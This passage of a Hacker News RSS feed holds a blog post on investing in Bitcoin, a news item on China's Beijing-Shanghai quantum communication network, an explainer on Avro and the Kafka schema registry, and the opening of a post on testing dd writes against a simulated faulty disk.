        </item>
        <item>
            <title>
<![CDATA[Can we afford to ignore Bitcoin?]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25669029">thread link</a>) | @Arturclancy
<br/>
January 7, 2021 | https://orujaliev.com/invest-in-bitcoin/ | <a href="https://web.archive.org/web/*/https://orujaliev.com/invest-in-bitcoin/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="mainContentOfPage">
		
<p><em>It is interesting again at the cryptocurrency market if you have missed the latest news. The price of Bitcoin has broken records of the three-year remoteness, with a rate of over $30,000. Opinions about the future of the coin are divided – some believe that we are facing another bubble. In contrast, others believe that the financial market will no longer be the same and that Bitcoin will be much more expensive in the long run. I admit I am not quite sure what is going on. But I am sure ignoring it is at least weird, so I tried to figure out a little bit about what is going on, and in this article, I am going to share my thoughts on whether it is worth invest in Bitcoin.</em></p>



<figure><img loading="lazy" width="1024" height="846" src="http://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-1024x846.png" alt="Bitcoin to dollar rate - Should you invest in Bitcoin?" title="Bitcoin to dollar rate" srcset="https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-1024x846.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-300x248.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-768x634.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-1536x1269.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05-700x578.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/coindesk-BTC-chart-2021-01-05.png 1770w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><strong><em>Bitcoin to dollar rate</em></strong></figcaption></figure>



<h2>Reasons to pay attention to Bitcoin</h2>



<p>If you have entirely closed financial affairs, enough life savings, and complete confidence in the reliability of the financial instruments you use, then you do not have to.</p>



<p>Similarly, if you believe that your daily needs are at the level you need at any time in your life, they will always be closed by your salary or business income. Namely, you are the kind of person who believes that there is real stability in our rapidly changing world with the regularly appearing “The Black Swan”.</p>



<p>Put, you either have enough money, or you have modest needs and indiscreet self-confidence. In that case, I guess you do not have to.</p>



<p>I am in a different situation. I do not believe in stability and see the absence of demand for many “lifelong professions” and the devaluation of savings and the meager pensions that people have worked for decades.</p>



<p>For that reason, I am interested in risk diversification. In professions, in businesses, in financial instruments. The latter today is the talk. I am willing to explore and consider any possibility to save the money I make and multiply it.</p>



<p>Bitcoin is such a tool. Subprime, perhaps with a foggy future – but a tool. And therefore – it is, at least, worthy of study.</p>



<h2>How to save money</h2>



<p>Some «experts» <a href="https://cointelegraph.com/news/top-6-bitcoin-price-predictions-to-watch-in-2021">claim</a> that the price of Bitcoin will reach $100,000, others forecast $300,000, of course, some say that even the figure of $1,000,000 for BTC is quite real. But what (and when, which is no less critical) will be the course, no one knows. All these statements are more like the publicity move of those who make them.</p>



<p>I am more interested in the other thing. When we talk about the Bitcoin rate, we peg it, for example, to US dollar. As we think it is the most reliable currency. But if we are talking about retaining the money for a long time, no financial advisor will ever advise you to keep all the money in it. The investment code indicates that it is necessary to buy different currencies and use other financial instruments (for example, stocks and bonds) to cover risks.</p>



<p>The dollar is rapidly going cheaper. Or everything becomes expensive. You can call it anything you want, but the point is the same. Everyone has examples. Some people rely on official statistics. I will bring out my life’s specifics by just looking at the significant expenses in my wallet. Ten years ago, the iPhone was sold for $499. A standard hotel room could be rented for $50. The price of real estate 20-30 years ago is not even worth remembering.</p>



<p>It is about inflation and about the complex interest that is often the problem. We may think that the numbers are changing slowly, but how in investment capitalisation of interest rates creates miracles and inflation produces a rapid depreciation of savings.</p>



<p>Let us talk about the US. The country with a strong economy, producing the dollar we are talking about. The average annual official <a href="https://www.usinflationcalculator.com/inflation/current-inflation-rates/">inflation</a> is 2.06%. Many may even say that it can be neglected. Perhaps. If it were not for the capitalization of interest. The purchasing power of $100 in 2000 is equal to the purchasing power of $150 in 2020. And that’s average, groceries have gone up less, and for example, education have gone up much more.</p>



<figure><img loading="lazy" width="1024" height="649" src="http://orujaliev.com/wp-content/uploads/2021/01/usdinflation-1024x649.png" alt="The purchasing power of the dollar considering «small» inflation 2% annual - Should you invest in Bitcoin?" title="The purchasing power of the dollar considering «small» inflation 2% annual - Should you invest in Bitcoin?" srcset="https://orujaliev.com/wp-content/uploads/2021/01/usdinflation-1024x649.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/usdinflation-300x190.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/usdinflation-768x487.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/usdinflation-1536x974.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/usdinflation-700x444.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/usdinflation.png 1820w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><strong><em><strong><em>The purchasing power of the dollar considering «small» inflation 2% annual&nbsp;</em></strong></em></strong></figcaption></figure>



<p>And so, again, back to the primary council on finance: to save, you must diversify risks. Real estate, gold, stocks – everyone chooses their instruments.</p>



<blockquote><p>We must remember – person who does not choose any financial instruments and keeps his dollars in bank account is getting poorer.</p></blockquote>



<p>The stock market has been considered a haven for many years. If you do not take a significant risk and do not try to overplay the market – it does help save, at least by covering inflation and, as a maximum allowing you to make money on investments.</p>



<p>But what we see today? Because of the Covid-19 pandemic, vast numbers of people were unemployed, and governments began to pay them various benefits. To cover the budget deficit, $3.5 trillion was <a href="https://www.usatoday.com/in-depth/money/2020/05/12/coronavirushow-u-s-printing-dollars-save-economy-during-crisis-fed/3038117001/">printed</a> only in the United States. Just think about the number of new money that was newly printed and put on the market. We will not even talk about the fact that the dollar <a href="https://www.investopedia.com/ask/answers/09/gold-standard.asp">has not been backed </a>by gold for 50 years.&nbsp;</p>



<p>What happened in the stock market in 2020 could not be imagined by even the most optimistic analyst. In a year of pandemics, mass unemployment, and stagnant economies, it grows like crazy.</p>



<figure><img loading="lazy" width="1024" height="655" src="http://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-1024x655.png" alt="Dow Jones index in 2020 - Should you invest in Bitcoin?
" title="Dow Jones index in 2020 - Should you invest in Bitcoin?" srcset="https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-1024x655.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-300x192.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-768x491.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-1536x983.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1-700x448.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/dowjoneschart2020-1.png 1744w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><em>Dow Jones index in 2020</em><br></figcaption></figure>



<p>There is no tourism. Restaurants are closed. The State prints and gives out money. People spend it on stocks. Now it’s so conveniently done on the mobile app that even regulators already have <a href="https://edition.cnn.com/2020/12/17/investing/robinhood-sec-settlement-deceptive-practices/index.html">questions</a> about this simplicity and gameplay.</p>



<p>People who never cared about stocks went to the stock market. And they started buying familiar brands. Economics? No, no one else cares. All that matters are the names that are in the public eye. Tesla’s case study is that the capitalization of the company has grown almost tenfold over the year. And its sales <a href="https://www.macrotrends.net/stocks/charts/TSLA/tesla/revenue">went</a> up…15 percent.</p>



<figure><img loading="lazy" width="1024" height="518" src="http://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-1024x518.png" alt="Tesla stock price in 2020 - Should you invest in Bitcoin?" title="Tesla stock price in 2020 - Should you invest in Bitcoin?" srcset="https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-1024x518.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-300x152.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-768x388.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-1536x776.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1-700x354.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/teslachart2020-2048x1035-1.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><strong><em>Tesla stock price in 2020</em></strong></figcaption></figure>



<p>Whether there will be a collapse is not a valid question. A more appropriate question is when it will be. Even the most experienced experts are difficult to answer. Politicians have come into play, and the printing press is not yet scheduled to shut down. I do not doubt that there is a bubble in the stock market.</p>



<h2>And Bitcoin growth in 2020 is not a bubble?</h2>



<p>Now let us look at what is going on in the cryptocurrency market. At first glance, the situation there is remarkably similar to the stock market. Coins are rapidly expensive, and events are reminiscent of 2017. But there are several significant differences.</p>



<h3>Bitcoin has not risen in price due to media publications</h3>



<p>It only got on the news agenda after the price exceeded the three-year-old record. And if in 2017 the attention of «housewives» was focused on cryptocurrencies, today they do not invest in bitcoin – their focus is the stock market. In Google Trends, Bitcoin awareness has <a href="https://trends.google.com/trends/explore?date=today%205-y&amp;geo=US&amp;q=bitcoin">increased</a>, but it is by order of magnitude less than three years earlier.</p>



<figure><img loading="lazy" width="1024" height="361" src="http://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-1024x361.png" alt="Interest to Bitcoin in Google Trends - Should you invest in Bitcoin?" title="Interest to Bitcoin in Google Trends - Should you invest in Bitcoin?" srcset="https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-1024x361.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-300x106.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-768x270.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-1536x541.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1-700x246.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoingoogletrends-2048x721-1.png 2048w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><strong><em>Interest to Bitcoin in Google Trends</em></strong></figcaption></figure>



<h3>Institutional investors join the Bitcoin market</h3>



<p>The growth of 2020 is mainly due to the investment business entry. Quoted on the stock market, MicroStrategy also invest in bitcoin – company <a href="https://www.bloomberg.com/news/articles/2020-12-07/microstrategy-to-raise-400-million-to-buy-even-more-bitcoin">purchased</a> 38,250 btc this year (at current rates of $1 billion). The largest payment services, Stripe and PayPal, began working with this cryptocurrency. Square allows customers to use the cryptocurrency as payment, and PayPal <a href="https://newsroom.paypal-corp.com/2020-10-21-PayPal-Launches-New-Service-Enabling-Users-to-Buy-Hold-and-Sell-Cryptocurrency">permitted</a> customers to buy Bitcoin directly from their PayPal accounts.</p>



<p>More and more professional invest in Bitcoin. Even the conservative Ray Dalio (the CEO of one of the largest funds) recently stated that he might have been very categorical and not even right about the future of Bitcoin. “I need to look at the Bitcoin and study it more”, – he recently <a href="https://news.bitcoin.com/ray-dalio-bitcoin/">stated</a>. Cryptocurrencies are added to the portfolios of Ark Investment Management, Fidelity Investments, and other funds. And not just investments funds. Even some pension funds are <a href="https://www.coindesk.com/pension-funds-double-crypto-asset-exposure-in-morgan-creeks-fund-to-1">starting</a> to invest in Bitcoin a small portion of their capital.</p>



<h3>Bitcoin is an alternative</h3>



<p>As mentioned earlier, in 2020, everything around us is volatile. Everything is feverish. Somewhere, bubbles are blowing up; somewhere; economies are falling. And capital, again, is looking for diversification. Because there is a lot of money globally, even a tiny fraction of it going to Bitcoin can cause the too high growth we see right now. Growth is driven by investment demand.</p>



<h2>Why bitcoin?</h2>



<p>Even those who are not familiar with the subject of cryptocurrencies have heard that <a href="https://orujaliev.com/invest-in-bitcoin/">Bitcoin is not the only cryptocurrency</a>. There are thousands of cryptocurrencies. So why we talk about Bitcoin?</p>



<p>Bitcoin is finite. It is digital gold. Only much more convenient and liquid. The algorithm is programmed to make just 21 million coins. Now 18.5 million have been mined, but let us not forget that about 4 million are irretrievably lost according to various estimates. Theoretically, the algorithm can be modified, but to do so, 51% of the miners must join and vote for it. The situation is almost impossible because it will make their assets cheaper. </p>



<p>If you invest in bitcoin, bought one coin, you have and will have one. No State or politician can turn on the printing press and blur your share. Bitcoin is popular. There are hundreds of social networks globally, but Facebook owns the market because it overcame the critical group of users, and eventually, more people come there. Cryptocurrencies are similar. There are thousands coins. But <a href="https://www.tradingview.com/markets/cryptocurrencies/global-charts/">70 percent of all capitalization is Bitcoin</a>. If I may say so, it is a market standard. Attempts to create an alternative have been made and are underway, but none of them have succeeded precisely for that reason.</p>



<figure><img loading="lazy" width="1024" height="724" src="http://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-1024x724.png" alt="The share of bitcoin in the cryptocurrency market exceeds 70%
" srcset="https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-1024x724.png 1024w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-300x212.png 300w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-768x543.png 768w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-1536x1087.png 1536w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare-700x495.png 700w, https://orujaliev.com/wp-content/uploads/2021/01/bitcoinmarketshare.png 1764w" sizes="(max-width: 1024px) 100vw, 1024px"><figcaption><strong><em>The share of bitcoin in the cryptocurrency market exceeds 70%</em></strong></figcaption></figure>



<p>Bitcoin is convenient. No, it is not suitable to buy pizza in a restaurant. It has other challenges and opportunities. For example, it is useful to transfer large amounts of money between countries or to carry capital. You can have as many millions as you want in the account, fly to wherever you want …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://orujaliev.com/invest-in-bitcoin/">https://orujaliev.com/invest-in-bitcoin/</a></em></p>]]>
            </description>
            <link>https://orujaliev.com/invest-in-bitcoin/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25669029</guid>
            <pubDate>Thu, 07 Jan 2021 09:25:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beijing-Shanghai Quantum Communication Network Put into Use]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668921">thread link</a>) | @mardiyah
<br/>
January 7, 2021 | http://english.cas.cn/newsroom/archive/news_archive/nu2017/201703/t20170324_175288.shtml | <a href="https://web.archive.org/web/*/http://english.cas.cn/newsroom/archive/news_archive/nu2017/201703/t20170324_175288.shtml">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <!--文章正文--><div><div><div><p><span lang="EN-US"><span size="+0"><p><span lang="EN-US"><span size="+0">The Beijing-Shanghai Backbone Network (BSBN), the world’s first long-distance quantum-secured communication route, was put into service on Aug. 30. It links the two cities with a highly-reliable and expandable secure communication expressway</span></span>.</p><p><span size="+0"><span size="+0"><span lang="EN-US">The node in Beijing will also cooperate with Micius, an experimental quantum satellite launched early last year, to lay the foundation for </span><span lang="EN-US">an integrated space-earth</span><span lang="EN-US"> quantum communication network as well as a global quantum communication network.</span></span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">BSBN was developed under the leadership of the University of Science and Technology of China (USTC). Several organizations have cooperated in the construction of BSBN, including the China Cable TV Network Co. Ltd., the Shandong Institute of Information and Communication Technology, the USTC Advanced Technology Institute, and the China Bank Regulatory Commission, among others.</span></span>&nbsp;</p><p><b><span lang="EN-US"><span size="+0">What is BSBN?</span></span></b>&nbsp;</p><p><span lang="EN-US"><span size="+0">BSBN, known officially as the National Demonstration Project of Verification and Application of Quantum Secure Communication between Beijing and Shanghai, has been called the “information security expressway.” </span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">The inter-city quantum communication line, which measures over 2000 km and comprises 32 relay stations, connects the cities of Beijing, Jinan, Hefei and Shanghai. Data can be transferred through the network with absolute security.</span></span>&nbsp;</p><p><span size="+0"><span size="+0"><span>“</span><span lang="EN-US">On the basis of the original fiber line, we utilized quantum key technology to give every message a unique encryption, and then transferred [the messages] through the traditional communication network,” said CHEN Yu’ao, a professor from the University of Science and Technology of China (USTC), and also Chief Designer of BSBN.</span></span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">Relay stations were built to solve the problem of signal attenuation during the transmission of the quantum key. In contrast with traditional transmission technology, BSBN’s relay stations will not receive then resend messages in transit. As a result, the whole transfer process will remain under direct control, according to CHEN.</span></span>&nbsp;</p><p><b><span lang="EN-US"><span size="+0">Promising Prospect</span></span></b>&nbsp;</p><p><span lang="EN-US"><span size="+0">A pilot project of BSBN was launched in January in Shanghai. The network uses quantum-secured fiber lines to connect seven financial institutes in Lujiazui’s Quantum Communication Industrial Park. Already, device adjustment for two of the institutes has been completed.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">Meanwhile, a command center and a big data center are also under construction.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">As part of the project, embedded control software for high-speed detection and quantum key distribution were developed for these centers, respectively.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">Several trials for the quantum communication network are now under way. As part of this process, data is transferred from the data center to another server in the same city, with quantum encryption by USTC. “Theoretically, it is impossible for data encrypted with quantum keys to be intercepted or interpreted. This is critically important for the transfer of financial data,” said REN Changqing, manager of the ICBC Data Center Network Department, one of the units involved in the trials.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">BSBN was constructed with fiber lines at relatively low cost, offering many promising application prospects. According to Prof. CHEN, BSBN can currently provide bandwidth of 100G, with a base project cost of less than RMB 600 million. In contrast, the current cost of comparable bandwidth is RMB 2 billion.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">More quantum communication lines will be built in the future to finally form a network, according to CHEN. “The changes will take place unnoticed; people will enjoy absolute information security without even realizing it,” he said.</span></span>&nbsp;</p><p><span lang="EN-US"><span size="+0">Prof. LU Zhaoyang, also from USTC, said he is expecting mass practical use of quantum communication within a few years. Traditional communication network hardware will be improved, rather than replaced. By installing quantum encrypting devices such as single photon detectors and quantum gateways on both the sender and receiver of the transmission, traditional communication networks can also conduct quantum communication, with obvious security improvements.</span></span>&nbsp;</p></span></span></p></div></div></div><!--文章正文-->

<!--<img src="../../../../../images/z19_contact_img.jpg" />-->
<!--<h5 class="xl_imgtxt">German Scientist Sees Unprecedented Opportunities in China</h5>-->

            </div></div>]]>
            </description>
            <link>http://english.cas.cn/newsroom/archive/news_archive/nu2017/201703/t20170324_175288.shtml</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668921</guid>
            <pubDate>Thu, 07 Jan 2021 09:10:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avro, Kafka and the Schema Registry: Clearing Things Up]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668916">thread link</a>) | @dhet
<br/>
January 7, 2021 | https://davidhettler.net/blog/avro-kafka-schema-registry/ | <a href="https://web.archive.org/web/*/https://davidhettler.net/blog/avro-kafka-schema-registry/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      
        <header>
          
          
            <p> 




  10 minute read

</p>
          
          <p>
          <strong>Demystifying Avro and the secret schema registry protocol</strong>
          </p>
        </header>
      

      <section itemprop="text">
        
        <p>From a bird’s-eye view, Avro is a binary serialization format just like many others: structured data can be serialized into a compact binary format to speed up the transport of data and to save storage space. However, when you take a closer look at Avro, fundamental differences to other established serialization schemes like Protobuf or Thrift become evident. In practice, those differences manifest themselves in a comparatively high compression ratio on the one hand, but an increase in complexity on the other.</p>

<p>Especially when employed in a distributed system, where serialized data is pushed over the wire, dealing with Avro becomes tricky. In particular, the concept of <strong>schema registries</strong> seems to be a common cause of confusion.</p>

<p>Everybody who has worked with an Avro/Kafka setup has probably at some point wondered:</p>
<ul>
  <li>When in the application’s lifecycle should a schema be registered?</li>
  <li>When is a schema pulled from the schema registry?</li>
  <li>When does the compatibility check take place?</li>
  <li>Why do I even need to pull a schema when the schema is already baked into the application?</li>
  <li>Why did my application crash with a deserialization exception again?</li>
  <li>Can we use JSON, please?</li>
</ul>

<p>This blog post may not have an answer to all of these questions but it’s a good starting point if you want to find out what goes on under the covers.</p>

<h2 id="whats-the-point">What’s the point?</h2>
<p>Why are schema registries a thing? And why do you hear the term mostly in the context of Avro and not so much in the context of, say, Protobuf? 
In order to answer this we first have to understand how Avro is different from other protocols. One of the key differences is that binary protocols such as Protobuf and Thrift rely on <strong>tags</strong> as means to match byte sequences to fields, whereas in Avro, such a concept does not exist.</p>

<h3 id="tags-vs-no-tags">Tags vs. no tags</h3>
<p>Tags are a way of mapping each field of a schema to a unique number, an ID. Within a serialized record, we can refer to a field by its ID and not say, by it’s name as it is the case for JSON. The result is that the serialized byte sequence is a lot more concise (compare a single integer to variable-length string). When the deserializer traverses a binary record and encounters a tag then it knows that the byte sequence that follows belongs to the field associated with that tag.</p>

<p>Here’s an example…</p>

<figure>
  <img src="https://davidhettler.net/assets/images/protobuf.png" alt="A serialized Protobuf record and its associated schema to demonstrate the use of tags">
  
    <figcaption>
      A serialized Protobuf record and its associated schema

    </figcaption></figure>

<p>On the left-hand side, you can see a Protobuf schema for the type “Animal” with three tags: the tags 1, 2 and 3 correspond to the fields “name”, “legs” and “hasTail”, respectively. On the right hand side, you can see a record which was serialized with that schema. We easily find that the animal in question is named “Lucy”, has four legs and a tail. You don’t have to understand every detail of the binary output, just know that the tags (marked in orange) tell the deserializer which bytes correspond to which field. This is important because the fields in the byte sequence are not in the same order as they were defined in the schema.</p>

<p>A disadvantage of tags is that they take up quite a bit of space (in the case of Protobuf it’s one byte per tag). In the image above, all bytes related to “meta data” are marked in grey, the remaining white boxes are the actual payload. You can see that the ratio between meta data (overhead) and payload data is not ideal. Can’t we reduce the number of grey boxes, e.g. by getting rid of tags? With Avro, we can. Avro does not rely on tags to identify fields. Instead, in the serialized byte sequence, all fields are appended back to back.</p>

<p>Here’s is the Avro equivalent of the Lucy example:</p>

<figure>
  <img src="https://davidhettler.net/assets/images/avro-record.png" alt="A serialized Avro record and its associated schema to demonstrate the use of tags">
  
    <figcaption>
      A serialized Avro record and its associated schema

    </figcaption></figure>

<p>Again, on the left hand side we see the schema, the <em>reader’s</em> schema to be precise. On the right hand side, the serialized record.</p>

<p>The first thing you might notice is that the record is quite a bit more compact. It takes up 30% less space than the Protobuf equivalent: 7 bytes vs. 10 bytes. The field values are marshaled byte-after-byte and there’s a lot less meta data within the record (fewer grey boxes).</p>

<p>Now you might be wondering: how does the deserializer know which byte sequence belongs to which field when there is no way of identifying the fields? How do we know that Lucy has four legs and not just one? Just by looking at the reader’s schema we cannot possibly know. In order to find out we need to look at the schema which the <strong>writer</strong> used when serializing the record. With both schemas side-by-side, we can make a comparison and find out the correct order of the fields.</p>

<figure>
  <img src="https://davidhettler.net/assets/images/side-by-side.png" alt="The writer's schema on the left and the reader's schema on the right. The order of records is mixed up.">
  
    <figcaption>
      Comparing the writer’s and the reader’s schema side-by-side

    </figcaption></figure>

<p>The order is all mixed up. According to the writer, <code>hasTail</code> should be at position one whereas according to the reader, it should be at position three, etc. But this is not a problem since the reader now has both schemas, they can reorder the fields and deserialize the record.</p>

<p>This approach, however, poses another problem: <strong>How does a reader know the writer’s schema?</strong> Here’s where the schema registry comes in.</p>

<h3 id="schema-registry-to-the-rescue">Schema registry to the rescue</h3>
<p>As the name suggests, a schema registry is a store for schemas. It provides an interface that allows you to retrieve and register schemas and check each of the schemas for compatibility. Effectively, it is nothing more than a CRUD application with a RESTful API and a persistent storage for schema definitions. Within the schema registry, each schema is assigned a unique ID. The reader can simply query the schema registry for the writer’s schema ID and retrieve the schema definition.</p>

<p>Now, we still haven’t clarified how the writer tells the reader <em>which</em> schema was used for serialization. There are several ways to do this. In the context of Kafka, there is one established method which relies on the convention that the writer <strong>prepends each serialized record with its respective schema ID</strong> before it is sent over the wire. The reader can then parse the first few bytes to find out the schema ID and ask the schema registry for the schema definition. Only then, the reader can determine schema compatibility, reorder the schema’s fields and start deserializing.</p>

<p>I know this might be a bit confusing (at least it was for me) so let’s have a look at an example.</p>

<h2 id="the-protocol">The protocol</h2>
<p>In this example scenario, we’ll look at a publisher who wants to write the Avro-serialized message “Foo” to the topic “my_topic” and a subscriber who wants to read that record.</p>

<figure>
  <img src="https://davidhettler.net/assets/images/example.png" alt="The example scenario expressed as diagram. A publisher sends a message to a subscriber over a Kafka topic.">
  
    <figcaption>
      An example scenario

    </figcaption></figure>

<h3 id="the-writers-side">The writer’s side</h3>

<p>Let’s first have a look at the left half of the image and take the writer’s perspective.</p>

<figure>
  <img src="https://davidhettler.net/assets/images/publisher.png" alt="A diagram depicing the protocol flow from the publisher's perspective.">
  
    <figcaption>
      The writer’s side

    </figcaption></figure>

<ol>
  <li>So we want to write the message “Foo” to the topic “my_topic”. While developing the application, we already determined the schema that we want to use. So technically, we could already serialize the record and publish it. Except, we can’t. Remember: With Avro, we need to signal which schema was used for serialization so that readers can check for compatibility and deserialize. In order to do this, we need the schema’s unique ID. How do we know the correct schema ID? Only the schema registry knows, so let’s ask it.</li>
  <li>We ask the schema registry: “Hey, I want to publish a record to “my_topic” using <em>this particular</em> schema. Is that alright, and if so could you tell me which schema ID to use?”. We do this by calling the <a href="https://docs.confluent.io/current/schema-registry/develop/api.html#post--subjects-(string-%20subject)-versions">API’s registration endpoint</a>. The endpoint expects an Avro schema in the request body. We’re going to put the schema we planned to use inside of it.</li>
  <li>The schema registry receives the request and looks up the schema in its persistent storage (a log-compacted topic named “_schemas”). If no schema is yet registered for the topic (what I refer to as “topic” is actually “subject” in schema registry terms) then the schema is registered and persisted.</li>
  <li>The schema registry compares the schema that it just looked up with the schema that we POSTed. If the schemas are incompatible according to <a href="https://docs.confluent.io/current/schema-registry/avro.html#schema-evolution-and-compatibility">Avro’s schema compatibility rules</a>, a client error (409) is returned to us. But in this example we’re good, the schemas are compatible and the schema ID is returned. Let’s assume that the ID is “5”.</li>
  <li>Great, so we have green light to use our schema for serialization. We serialize the record and find its binary repesentation is “<code>06 46 6F 6F</code>”.</li>
  <li>Now we can prepend the message with the schema ID and publish the record. Off we go!</li>
</ol>

<h3 id="the-readers-side">The reader’s side</h3>

<p>Now let’s look at the other half of the image and slip into the role of the consumer.</p>

<figure>
  <img src="https://davidhettler.net/assets/images/subscriber.png" alt="A diagram depicing the protocol flow from the subscriber's perspective.">
  
    <figcaption>
      The reader’s side

    </figcaption></figure>

<ol>
  <li>As a consumer we’re notified about a new record in the “my_topic” topic that the writer previously published to. How do we deserialize the record? We already <em>know</em> which schema to use for deserialization: while writing the application we defined that “for <em>this</em> particular topic we use <em>that</em> particular schema”. But why can’t we just use our own schema and be done with it? The answer is that, again, <strong>Avro needs both the writer and the reader schema in order to identify which bytes correspond to which field</strong> and to determine whether the schemas are compatible. So we need to retrieve the writer’s schema from the schema registry. We look at the first few bytes of the message and discover that the writer used the schema ID “5”.</li>
  <li>We ask the schema registry which schema is associated with schema “5” by calling the corresponding <a href="https://docs.confluent.io/current/schema-registry/develop/api.html#get--schemas-ids-int-%20id">API endpoint</a>.</li>
  <li>Again, a lookup in the persistent store is made.</li>
  <li>The endpoint returns the schema definition associated with schema ID 5.</li>
  <li>We compare the returned schema with the schema that we planned to use. By looking at the two schemas side-by-side we can identify each field and also determine whether the schemas are compatible. If everything is ok we can finally deserialize the record and read the original message.</li>
</ol>

<p><strong>Note…</strong></p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://davidhettler.net/blog/avro-kafka-schema-registry/">https://davidhettler.net/blog/avro-kafka-schema-registry/</a></em></p>]]>
            </description>
            <link>https://davidhettler.net/blog/avro-kafka-schema-registry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25668916</guid>
            <pubDate>Thu, 07 Jan 2021 09:09:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[dd, bs= and why you should use conv=fsync]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25668802">thread link</a>) | @mg
<br/>
January 7, 2021 | https://abbbi.github.io/dd/ | <a href="https://web.archive.org/web/*/https://abbbi.github.io/dd/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>This story starts with me having to simulate a faulty disk device for testing.
The Linux Kernel Device mapper is a good solution for this, so i created a
faulty device with a simple file backend:</p>

<figure><pre><code data-lang="bash"> <span>truncate</span> <span>-s</span> 1G /tmp/baddisk
 losetup /dev/loop2 /tmp/baddisk
 dmsetup create baddisk <span>&lt;&lt;</span> <span>EOF</span><span> 
    0 6050 linear /dev/loop2 0
    6050 155 error
    6205 2090947 linear /dev/loop2 6205 
 EOF</span></code></pre></figure>

<p>These commands setup a new device on <em>/dev/mapper/baddisk</em> with <em>1GB</em> of size.
Starting from sector <em>6050</em>, there are <em>155</em> faulty sectors, where any write and
read operation should cause I/O errors.</p>

<p>I went on and used <em>dd</em> to write to the device, as the first faulty block
should start around <em>3MB</em>, i used the following command:</p>

<figure><pre><code data-lang="bash">  <span>dd </span><span>if</span><span>=</span>/dev/zero <span>of</span><span>=</span>/dev/mapper/baddisk <span>bs</span><span>=</span>4096 <span>count</span><span>=</span>1000
  4096000 bytes <span>(</span>4.1 MB, 3.9 MiB<span>)</span> copied, 0.0107267 s, 382 MB/s</code></pre></figure>

<p>To my surprise, the command succeeded. I assumed some error in my setup and
